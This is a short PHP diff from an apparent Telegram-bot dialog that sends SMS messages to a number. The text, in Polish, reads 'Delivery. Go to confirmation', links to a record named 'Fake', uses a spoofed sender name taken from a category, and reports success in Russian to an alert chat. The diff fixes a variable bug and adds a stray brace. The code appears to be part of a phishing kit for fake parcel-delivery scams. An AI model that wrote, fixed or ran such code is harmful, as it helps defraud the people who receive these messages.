@@ -67,7 +67,7 @@ class SendSmsDialog extends Dialog
                 $data = $this->getData()->only(['track_id', 'number'])->toArray();
                 $fake = Fake::whereTrackId($data['track_id'])->first();
                 $link = SmsApi::getSlug($data['number'], $fake->link());
-                $result = SmsApi::sendSms($number, "Dostawa. Przejdź do potwierdzenia: $link", ucfirst($fake->category->name))->getData(true);
+                $result = SmsApi::sendSms($data['number'], "Dostawa. Przejdź do potwierdzenia: $link", ucfirst($fake->category->name))->getData(true);
                 if ($result['error']) {
                     $text = $this->makeText([
                         "❗️ <b>Ошибка</b>",
@@ -75,7 +75,7 @@ class SendSmsDialog extends Dialog
                         "<i>{$result['msg']}</i>"
                     ]);
                 } else {
-                    $text = "<i>Сообщения успешно отправлен на номер</i> <b>$number</b>";
+                    $text = "<i>Сообщения успешно отправлен на номер</i> <b>{$data['number']}}</b>";
                     if ($alertId = $this->getConfig('groups.alert.id')) $this->telegram->sendMessage([
                         "chat_id" => $alertId,
                         "text" => makeText([
